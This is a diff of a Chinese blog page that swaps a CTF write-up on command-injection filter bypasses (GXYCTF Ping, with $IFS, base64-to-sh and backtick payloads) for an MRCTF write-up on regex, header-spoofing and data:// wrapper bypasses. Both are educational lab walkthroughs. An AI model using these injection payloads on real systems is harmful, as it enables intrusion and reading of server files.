@@ -6,30 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>GXY-Ping | Welcome to Tristan&#39;s Blog!</title>
+  <title>MRCTF | Welcome to Tristan&#39;s Blog!</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="GXYCTF——Ping Ping Ping知识点1、绕过空格过滤的几种姿势2、内联执行3、变量拼接绕过姿势4、绕过cat过滤的几种姿势 实战Ping Ping Ping打开页面，发现只有“&#x2F;?ip&#x3D;”，联想到之前做过的题目，猜测这里可能存在命令执行漏洞；可以通过利用分号或管道符，执行攻击者构造的命令；测试发现可行使用ls后，发现存在两个文件“flag.php”、“index.php”尝试读取fl">
+  <meta name="description" content="MRCTF–套娃查看源码，发现：要求不能出现”_”，想到URL编码，但是正则要求不能为%5f（_对应的URL编码就是%5f）。但是可以使用%5F绕过；第二个条件：要求$_GET[b_u_p_t]&#x3D;23333，又不能为2333；之前也提过对于&#x2F;^xxx$&#x2F;类型的正则匹配，可以使用%0a绕过；所以构造payload: http:&#x2F;&#x2F;b1a486b8-3995-435d-948f-dabc07641b0">
 <meta property="og:type" content="article">
-<meta property="og:title" content="GXY-Ping">
-<meta property="og:url" content="http://yoursite.com/2020/04/07/GXY-Ping/index.html">
+<meta property="og:title" content="MRCTF">
+<meta property="og:url" content="http://yoursite.com/2020/04/20/MRCTF/index.html">
 <meta property="og:site_name" content="Welcome to Tristan&#39;s Blog!">
-<meta property="og:description" content="GXYCTF——Ping Ping Ping知识点1、绕过空格过滤的几种姿势2、内联执行3、变量拼接绕过姿势4、绕过cat过滤的几种姿势 实战Ping Ping Ping打开页面，发现只有“&#x2F;?ip&#x3D;”，联想到之前做过的题目，猜测这里可能存在命令执行漏洞；可以通过利用分号或管道符，执行攻击者构造的命令；测试发现可行使用ls后，发现存在两个文件“flag.php”、“index.php”尝试读取fl">
+<meta property="og:description" content="MRCTF–套娃查看源码，发现：要求不能出现”_”，想到URL编码，但是正则要求不能为%5f（_对应的URL编码就是%5f）。但是可以使用%5F绕过；第二个条件：要求$_GET[b_u_p_t]&#x3D;23333，又不能为2333；之前也提过对于&#x2F;^xxx$&#x2F;类型的正则匹配，可以使用%0a绕过；所以构造payload: http:&#x2F;&#x2F;b1a486b8-3995-435d-948f-dabc07641b0">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://yoursite.com/2020/04/07/images/6.jpg">
-<meta property="og:image" content="http://yoursite.com/2020/04/07/images/7.jpg">
-<meta property="og:image" content="http://yoursite.com/2020/04/07/images/8.jpg">
-<meta property="og:image" content="http://yoursite.com/2020/04/07/images/9.jpg">
-<meta property="og:image" content="http://yoursite.com/2020/04/07/images/10.jpg">
-<meta property="og:image" content="http://yoursite.com/2020/04/07/images/11.jpg">
-<meta property="og:image" content="http://yoursite.com/2020/04/07/images/12.jpg">
-<meta property="og:image" content="http://yoursite.com/2020/04/07/images/13.jpg">
-<meta property="og:image" content="http://yoursite.com/2020/04/07/images/14.jpg">
-<meta property="article:published_time" content="2020-04-07T07:19:54.000Z">
-<meta property="article:modified_time" content="2020-04-07T08:52:37.809Z">
+<meta property="og:image" content="http://yoursite.com/2020/04/20/images/34.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/04/20/images/35.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/04/20/images/37.jpg">
+<meta property="article:published_time" content="2020-04-20T13:13:51.000Z">
+<meta property="article:modified_time" content="2020-04-20T13:34:39.760Z">
 <meta property="article:author" content="Tristan">
-<meta property="article:tag" content="web,命令执行,CTF">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/2020/04/07/images/6.jpg">
+<meta name="twitter:image" content="http://yoursite.com/2020/04/20/images/34.jpg">
   
     <link rel="alternative" href="/atom.xml" title="Welcome to Tristan&#39;s Blog!" type="application/atom+xml">
   
@@ -147,33 +141,41 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-GXY-Ping" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-MRCTF" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      GXY-Ping
+      MRCTF
     </h1>
   
 
         
-        <a href="/2020/04/07/GXY-Ping/" class="archive-article-date">
-  	<time datetime="2020-04-07T07:19:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-07</time>
+        <a href="/2020/04/20/MRCTF/" class="archive-article-date">
+  	<time datetime="2020-04-20T13:13:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-20</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="GXYCTF——Ping-Ping-Ping"><a href="#GXYCTF——Ping-Ping-Ping" class="headerlink" title="GXYCTF——Ping Ping Ping"></a>GXYCTF——Ping Ping Ping</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>1、绕过空格过滤的几种姿势<br>2、内联执行<br>3、变量拼接绕过姿势<br>4、绕过cat过滤的几种姿势</p>
-<h3 id="实战Ping-Ping-Ping"><a href="#实战Ping-Ping-Ping" class="headerlink" title="实战Ping Ping Ping"></a>实战Ping Ping Ping</h3><p>打开页面，发现只有“/?ip=”，联想到之前做过的题目，猜测这里可能存在命令执行漏洞；可以通过利用分号或管道符，执行攻击者构造的命令；<br>测试发现可行<br><img src="../images/6.jpg" alt="1"><br>使用ls后，发现存在两个文件“flag.php”、“index.php”<br><img src="../images/7.jpg" alt="2"><br>尝试读取flag.php:cat flag.php（怎么可能这么简单呢….）发现过滤了空格。<br><img src="../images/8.jpg" alt="3"></p>
-<h5 id="前方知识点出没！"><a href="#前方知识点出没！" class="headerlink" title="前方知识点出没！"></a>前方知识点出没！</h5><p>对于过滤空格的情况，通常有以下几个姿势绕过：<br>（1）%09 %20<br>（2）&lt;&gt; 、&lt;<br>（3）${IFS}、$IFS、$IFS$9<br>（4）{cat,flag} 利用花括号和逗号也可绕过<br>经过尝试，发现$IFS$9可行，可是又过滤了flag…<br><img src="../images/9.jpg" alt="4"><br>试着用“f\l\a\g”，绕过失败…于是转换目标对象，试着看看index.php的内容<br>发现过滤了标点符号、bash、flag；<br><img src="../images/10.jpg" alt="5"><br>既然过滤了bash，那试试看能否通过sh执行（因为大部分在bash下的命令在sh中也可执行）<br>构造如下payload：</p>
-<pre><code>/?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh</code></pre><p>查看源码发现flag<br><img src="../images/11.jpg" alt="6"></p>
-<h5 id="前方知识点出没！-1"><a href="#前方知识点出没！-1" class="headerlink" title="前方知识点出没！"></a>前方知识点出没！</h5><p>我们稍微拓展一下，如果“cat”被ban了，有什么办法呢？<br>（1）tac：从最后一行倒序显示内容，并将所有内容输出<br>（2）more: 根据窗口大小，一页一页的现实文件内容<br>（3）tail: 只显示最后几行<br>（4）paste也可读取文件<br>（5）ca\t flag.text<br><img src="../images/12.jpg" alt="7"><br>后来看了其他师傅的WP，还有其他解法<br>1、变量拼接，先上payload:</p>
-<pre><code>/?ip=127.0.0.1;a=g;cat$IFS$fla$a</code></pre><p>为什么有这种想法呢？因为通过查看Index.php的源码，发现有一个变量a可控；那么通过变量拼接，可以巧妙的读取flag.php。<br><img src="../images/13.jpg" alt="8"><br>2、内联执行<br>首先简单说明一下，什么是内联执行；cat `ls`;将ls的命令输出作为前面cat命令的输入量；<br><img src="../images/14.jpg" alt="9"><br>构造payload:</p>
-<pre><code>/?ip=127.0.0.1;cat$IFS$9`ls`</code></pre><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>对于命令执行，通常可以这样做：<br>（1）cat flag  这种做法一般会遇到很多限制：cat、flag等被ban，利用姿势绕过<br>（2）echo “Y2F0IGZsYWcucGhw”| base64 -d | bash” ==&gt;cat flag；如果bash被ban，可以使用sh；<br>（3）使用内联执行：cat <code>ls</code>;</p>
+        <h3 id="MRCTF–套娃"><a href="#MRCTF–套娃" class="headerlink" title="MRCTF–套娃"></a>MRCTF–套娃</h3><p>查看源码，发现：<br><img src="../images/34.jpg" alt="1"><br>要求不能出现”_”，想到URL编码，但是正则要求不能为%5f（_对应的URL编码就是%5f）。但是可以使用%5F绕过；<br>第二个条件：要求$_GET[b_u_p_t]=23333，又不能为2333；之前也提过对于/^xxx$/类型的正则匹配，可以使用%0a绕过；<br>所以构造payload:</p>
+<pre><code>http://b1a486b8-3995-435d-948f-dabc07641b05.node3.buuoj.cn/index.php?b%5Fu%5Fp%5Ft=23333%0a</code></pre><p>拿到提示flag在secrettw.php<br>进去发现：<br><img src="../images/35.jpg" alt="2"><br>要求我们使用本地登陆，bp拦截添加Client-IP:127.0.0.1即可；同时说明我们没有权限，view-source后，发现一段jsfuck加密的密文，解密后提示POST Merak，尝试POST Merak=admin（Merak随便什么值即可）显示了源码：<br><img src="../images/37.jpg" alt="3"><br>要求我们传入两个参数2333和file，第一个参数用来作为文件名，且该文件名对应内容要为”todat is a happy day”;使用data://协议即可。第二个file参数经过change()函数后返回要读文件名，也就是flagphp；写个dechange脚本，即可拿到file的值，脚本如下：</p>
+<pre><code>&lt;?php
+    function dechange($a){
+        $re=&apos;&apos;;
+        for($i=0;$i&lt;strlen($a);$i++){
+            $re.=chr(ord($a[$i])-$i*2);
+        }
+        $result=base64_encode($re);
+        return $result;
+    }
+
+echo (dechange(&apos;flag.php&apos;));
+?&gt;</code></pre><p>得到file值为ZmpdYSZmXGI=<br>最后构造payload:</p>
+<pre><code>b1a486b8-3995-435d-948f-dabc07641b05.node3.buuoj.cn/secrettw.php?2333=data://text/plain,todat  is  a  happy day&amp;file=ZmpdYSZmXGI=</code></pre><p>即可得flag</p>
 
       
 
@@ -187,7 +189,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">web,命令执行,CTF</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
         		</li>
       		
 		</ul>
@@ -243,7 +245,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/04/07/GXY-Ping/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/04/20/MRCTF/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -257,18 +259,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/04/07/Fakebook/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2020/04/20/%E6%97%A0%E5%8F%82RCE/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          Fakebook
+          无参RCE
         
       </div>
     </a>
   
   
-    <a href="/2020/04/01/Preg-replace/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Preg_replace引起的命令执行漏洞</div>
+    <a href="/2020/04/19/Python-test/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Python_test</div>
       <i class="icon-circle-right"></i>
     </a>
   
